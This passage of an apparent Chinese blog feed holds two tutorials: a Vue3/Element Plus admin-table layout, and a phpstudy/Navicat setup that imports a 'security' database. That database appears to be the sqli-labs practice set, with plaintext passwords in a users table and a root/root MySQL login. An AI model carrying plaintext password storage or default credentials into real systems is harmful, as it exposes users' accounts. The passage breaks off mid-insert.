alt="image-20231211194441988"></p><p>将源代码copy至“APP.vue”中的“teplate”处</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211194852208.png" alt="image-20231211194852208"></p><h3 id="侧边栏设计"><a href="#侧边栏设计" class="headerlink" title="侧边栏设计"></a>侧边栏设计</h3><p>观察目标图，也可在vue官网找到相似垂直菜单，可内嵌子菜单。此菜单通过 el-menu-item-group 组件可以实现菜单进行分组，分组名可以通过 title 属性直接设定，也可以通过具名 slot 来设定。如图所示：</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211195115524.png" alt="image-20231211195115524"></p><p>将此源码进行copy，需在总体布局中的<code>&lt;/el-aside&gt;</code>标签内进行粘贴。并且参照目标图对其中内容进行修改。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211195457188.png" alt="image-20231211195457188"></p><p>此命名采用的数组形式进行命名：首先在<code>&lt;script&gt;</code>中添加如下数组（name为T0级，其下级则用“children：【{}】”往下嵌套，依次往复嵌套）</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211195700213.png" alt="image-20231211195700213"></p><p>如我们侧边菜单栏第一栏为<strong>“用户管理”</strong>，若我们需要输出此项，则输出格式为<strong>“”</strong>。若我们需要输出<strong>“用户列表”</strong>，则输出格式为**“。以此规律，往复嵌套，如图所示。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211200411394.png" alt="image-20231211200411394"></p><h3 id="页头设计"><a href="#页头设计" class="headerlink" title="页头设计"></a>页头设计</h3><p>在vue官网中找到类似页头，并在其上按照目标头进行修改。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211200657319.png" alt="image-20231211200657319"></p><p>将需要的源代码复制，粘贴在<code>&lt;el-header&gt;</code>标签内，并对其中内容做相应调整。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211202429117.png" alt="image-20231211202429117"></p><h3 id="搜索框设计"><a href="#搜索框设计" class="headerlink" title="搜索框设计"></a>搜索框设计</h3><p>在<el-main>中编辑搜索框代码，代码内容如图：</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211203155862.png" alt="image-20231211203155862"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211203235079.png" alt="image-20231211203235079"></p><p>代码解释：</p><p><code>display: flex;</code>：设置<code>.search-group</code>这个类的元素为弹性盒子布局（Flexbox）。Flexbox布局允许你以灵活的方式对子元素进行排列，无论是水平还是垂直。</p><p>这段HTML代码会显示一个有两个按钮（搜索和添加用户）和一个输入框的组，这个组在水平方向上是居中的，在垂直方向上子元素是居中对齐的，并且子元素之间有10像素的间隔。</p><h3 id="表单框设计"><a href="#表单框设计" class="headerlink" title="表单框设计"></a>表单框设计</h3><p>在vue官网中找到类似表单，并在其上按照目标表单进行修改。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217092846339.png" alt="image-20231217092846339"></p><h1 id="vue3制作简单网页"><a href="#vue3制作简单网页" class="headerlink" title="vue3制作简单网页"></a>vue3制作简单网页</h1><p>结合以上布局，结合以下图中目标网页进行模仿</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217092346492.png" alt="image-20231217092346492"></p><p>首先将上述布局整体复制，最后添加相应图标以及更改页头布局和相关按键</p><p>表单关键代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-main</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;search-group&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 搜索用户输入框 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">placeholder</span>=<span class="string">&quot;搜索用户&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 搜索按钮 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;el-icon-search&quot;</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 添加用户按钮 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;el-icon-plus&quot;</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%&quot;</span> <span class="attr">class</span>=<span class="string">&quot;biao&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;序号&quot;</span> <span class="attr">label</span>=<span class="string">&quot;序号&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;姓名&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;邮箱&quot;</span> <span class="attr">label</span>=<span class="string">&quot;邮箱&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;手机&quot;</span> <span class="attr">label</span>=<span class="string">&quot;手机&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;角色&quot;</span> <span class="attr">label</span>=<span class="string">&quot;角色&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">&quot;状态&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">&quot;sss&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-switch</span> <span class="attr">v-model</span>=<span class="string">&quot;sss.row.状态&quot;</span> <span class="attr">active-color</span>=<span class="string">&quot;#13ce66&quot;</span> <span class="attr">inactive-color</span>=<span class="string">&quot;#ff4949&quot;</span></span></span><br><span class="line"><span class="tag">                  @<span class="attr">change</span>=<span class="string">&quot;handleStatusChange(sss.row)&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-switch</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;创建时间&quot;</span> <span class="attr">label</span>=<span class="string">&quot;创建时间&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">&quot;操作&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">&quot;scope&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Edit&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Delete&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;warning&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Setting&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为连接了<code>&lt;script&gt;</code>，所以<code>&lt;script&gt;</code>相关代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    序号: &#x27;1&#x27;,</span><br><span class="line">    姓名: &#x27;2016-05-03&#x27;,</span><br><span class="line">    邮箱: &#x27;Tom&#x27;,</span><br><span class="line">    手机: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">    角色: &#x27;11111&#x27;,</span><br><span class="line">    创建时间: &#x27;21212&#x27;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    序号: &#x27;2&#x27;,</span><br><span class="line">    姓名: &#x27;2016-05-03&#x27;,</span><br><span class="line">    邮箱: &#x27;Tom&#x27;,</span><br><span class="line">    手机: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">    角色: &#x27;11111&#x27;,</span><br><span class="line">    创建时间: &#x27;21212&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  .....</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217093245664.png" alt="image-20231217093245664"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vue3基础配置&quot;&gt;&lt;a href=&quot;#vue3基础配置&quot; class=&quot;headerlink&quot; title=&quot;vue3基础配置&quot;&gt;&lt;/a&gt;vue3基础配置&lt;/h1&gt;&lt;h3 id=&quot;创建一个空白文件夹，并且用VScode打开这个空白文件夹。打开终端输入以下指令：&quot;</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>php的基本认识</title>
    <link href="http://example.com/2023/12/17/php%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/"/>
    <id>http://example.com/2023/12/17/php%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</id>
    <published>2023-12-17T01:07:54.374Z</published>
    <updated>2023-12-17T01:16:11.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php的基本认识"><a href="#php的基本认识" class="headerlink" title="php的基本认识"></a>php的基本认识</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><blockquote><ul><li>安装“phpstudy”软件</li><li>安装“navicat”软件</li></ul></blockquote><h2 id="配置“phpstudy”软件"><a href="#配置“phpstudy”软件" class="headerlink" title="配置“phpstudy”软件"></a>配置“phpstudy”软件</h2><h3 id="1-下载安装完成后，打开软件，在首页讲此启动“Apache2-4-39”以及”MySQL5-7-26“。"><a href="#1-下载安装完成后，打开软件，在首页讲此启动“Apache2-4-39”以及”MySQL5-7-26“。" class="headerlink" title="1.下载安装完成后，打开软件，在首页讲此启动“Apache2.4.39”以及”MySQL5.7.26“。"></a>1.下载安装完成后，打开软件，在首页讲此启动“Apache2.4.39”以及”MySQL5.7.26“。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201118649.png" alt="image-20231212201118649"></p><h3 id="2-点击侧栏”网站“，并且点击”管理“后点击”修改“按键。"><a href="#2-点击侧栏”网站“，并且点击”管理“后点击”修改“按键。" class="headerlink" title="2.点击侧栏”网站“，并且点击”管理“后点击”修改“按键。"></a>2.点击侧栏”网站“，并且点击”管理“后点击”修改“按键。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201259169.png" alt="image-20231212201259169"></p><h3 id="3-随后在”高级配置“中将”目标索引“打开。"><a href="#3-随后在”高级配置“中将”目标索引“打开。" class="headerlink" title="3.随后在”高级配置“中将”目标索引“打开。"></a>3.随后在”高级配置“中将”目标索引“打开。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201340654.png" alt="image-20231212201340654"></p><h3 id="4-随后打开”根目录“，把里面文件全部删除。"><a href="#4-随后打开”根目录“，把里面文件全部删除。" class="headerlink" title="4.随后打开”根目录“，把里面文件全部删除。"></a>4.随后打开”根目录“，把里面文件全部删除。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201437619.png" alt="image-20231212201437619"></p><h2 id="配置“navicat”软件"><a href="#配置“navicat”软件" class="headerlink" title="配置“navicat”软件"></a>配置“navicat”软件</h2><h3 id="1-下载安装完“navicat”软件后，打开软件，进入首页点击”连接“。"><a href="#1-下载安装完“navicat”软件后，打开软件，进入首页点击”连接“。" class="headerlink" title="1.下载安装完“navicat”软件后，打开软件，进入首页点击”连接“。"></a>1.下载安装完“navicat”软件后，打开软件，进入首页点击”连接“。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201650169.png" alt="image-20231212201650169"></p><h3 id="2-随后点击”M有SQL“"><a href="#2-随后点击”M有SQL“" class="headerlink" title="2.随后点击”M有SQL“"></a>2.随后点击”M有SQL“</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212201731891.png" alt="image-20231212201731891"></p><h3 id="3-打开后，”连接名“自定，主机因为连接本地所以填”localhost“，端口默认，用户名默认，密码是”root“。"><a href="#3-打开后，”连接名“自定，主机因为连接本地所以填”localhost“，端口默认，用户名默认，密码是”root“。" class="headerlink" title="3.打开后，”连接名“自定，主机因为连接本地所以填”localhost“，端口默认，用户名默认，密码是”root“。"></a>3.打开后，”连接名“自定，主机因为连接本地所以填”localhost“，端口默认，用户名默认，密码是”root“。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212202226504.png" alt="image-20231212202226504"></p><h3 id="4-右键点击刚刚所创建的”连接“，并且选择”新建数据库“。"><a href="#4-右键点击刚刚所创建的”连接“，并且选择”新建数据库“。" class="headerlink" title="4.右键点击刚刚所创建的”连接“，并且选择”新建数据库“。"></a>4.右键点击刚刚所创建的”连接“，并且选择”新建数据库“。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212202433398.png" alt="image-20231212202433398"></p><h3 id="5-”数据库名“填写”security“，字符集选择”utf8mb4“。"><a href="#5-”数据库名“填写”security“，字符集选择”utf8mb4“。" class="headerlink" title="5.”数据库名“填写”security“，字符集选择”utf8mb4“。"></a>5.”数据库名“填写”security“，字符集选择”utf8mb4“。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212202717435.png" alt="image-20231212202717435"></p><h3 id="6-点击”新建查询“，并且选择”所建连接“中的”security”-随后将以下代码复制粘贴至搜索框中点击搜索。"><a href="#6-点击”新建查询“，并且选择”所建连接“中的”security”-随后将以下代码复制粘贴至搜索框中点击搜索。" class="headerlink" title="6.点击”新建查询“，并且选择”所建连接“中的”security”,随后将以下代码复制粘贴至搜索框中点击搜索。"></a>6.点击”新建查询“，并且选择”所建连接“中的”security”,随后将以下代码复制粘贴至搜索框中点击搜索。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212202935464.png" alt="image-20231212202935464"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Navicat Premium Data Transfer</span></span><br><span class="line"><span class="comment"> Source Server         : 1</span></span><br><span class="line"><span class="comment"> Source Server Type    : MySQL</span></span><br><span class="line"><span class="comment"> Source Server Version : 50741</span></span><br><span class="line"><span class="comment"> Source Host           : localhost:3306</span></span><br><span class="line"><span class="comment"> Source Schema         : security</span></span><br><span class="line"><span class="comment"> Target Server Type    : MySQL</span></span><br><span class="line"><span class="comment"> Target Server Version : 50741</span></span><br><span class="line"><span class="comment"> File Encoding         : 65001</span></span><br><span class="line"><span class="comment"> Date: 12/12/2023 15:44:36</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for emails</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `emails`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `emails`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `email_id` <span class="type">varchar</span>(<span class="number">30</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB AUTO_INCREMENT <span class="operator">=</span> <span class="number">9</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> gbk <span class="keyword">COLLATE</span> <span class="operator">=</span> gbk_chinese_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of emails</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Dumb@dhakkan.com&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;Angel@iloveu.com&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;Dummy@dhakkan.local&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;secure@dhakkan.local&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="string">&#x27;stupid@dhakkan.local&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;superman@dhakkan.local&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">7</span>, <span class="string">&#x27;batman@dhakkan.local&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `emails` <span class="keyword">VALUES</span> (<span class="number">8</span>, <span class="string">&#x27;admin@dhakkan.com&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for referers</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `referers`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `referers`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `referer` <span class="type">varchar</span>(<span class="number">256</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ip_address` <span class="type">varchar</span>(<span class="number">35</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB AUTO_INCREMENT <span class="operator">=</span> <span class="number">1</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> gbk <span class="keyword">COLLATE</span> <span class="operator">=</span> gbk_chinese_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for uagents</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `uagents`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `uagents`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `uagent` <span class="type">varchar</span>(<span class="number">256</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ip_address` <span class="type">varchar</span>(<span class="number">35</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB AUTO_INCREMENT <span class="operator">=</span> <span class="number">1</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> gbk <span class="keyword">COLLATE</span> <span class="operator">=</span> gbk_chinese_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `users`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `users`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB AUTO_INCREMENT <span class="operator">=</span> <span class="number">15</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> gbk <span class="keyword">COLLATE</span> <span class="operator">=</span> gbk_chinese_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Dumb&#x27;</span>, <span class="string">&#x27;Dumb&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;Angelina&#x27;</span>, <span class="string">&#x27;I-kill-you&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;Dummy&#x27;</span>, <span class="string">&#x27;p@ssword&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;crappy&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="string">&#x27;stupid&#x27;</span>, <span class="string">&#x27;stupidity&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;superman&#x27;</span>, <span class="string">&#x27;genious&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">7</span>, <span class="string">&#x27;batman&#x27;</span>, <span class="string">&#x27;mob!le&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">8</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span 